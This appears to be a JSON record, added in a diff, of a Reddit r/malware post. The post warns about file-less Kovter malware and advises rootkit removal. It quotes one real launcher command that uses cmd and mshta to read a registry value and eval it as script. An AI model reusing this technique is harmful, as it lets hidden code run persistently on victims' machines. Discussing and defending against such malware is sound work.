@@ -1,0 +1,21 @@
+{
+    "op": {
+        "upvote_ratio": null,
+        "selftext": "Some of the most recent malware coming out of eastern Europe, like the Kovter family do not have any files. Instead, they use a shortcut to launch scripts that address binary strings of code in the Registry. Like this:\n\nC:\\Windows\\System32\\cmd.exe /C start \"\" mshta.exe \"javascript:KtTUE9e=\"w\";cI35=new ActiveXObject(\"WScript.Shell\");YSI5Vhe1O=\"BBNVq\";y3Adm=cI35.RegRead(\"HKCU\\\\software\\\\wmvg\\\\nwjfhxsp\");XZ6XLws=\"WE3S45pc\";eval(y3Adm);CGdL4K=\"X\";\"\n\nKovterLnk-A will restore itself from control servers if not completely defeated. Run a good rootkit removal tool in Safe Mode to kill it. (Malwarebytes Anti-Rootkit Beta, for example) ",
+        "title": "A few words about new file-less malware",
+        "score": 37,
+        "id": "85fjxv",
+        "commsNum": 26,
+        "timeStamp": "2018/03/18-17:34:47",
+        "author_name": "imon_2nd",
+        "is_self": true,
+        "locked": false,
+        "num_comments": 26,
+        "over_18": false,
+        "spoiler": false,
+        "subreddit": "malware",
+        "stickied": false,
+        "url": "https://www.reddit.com/r/Malware/comments/85fjxv/a_few_words_about_new_fileless_malware/"
+    },
+    "posts": {}
+}
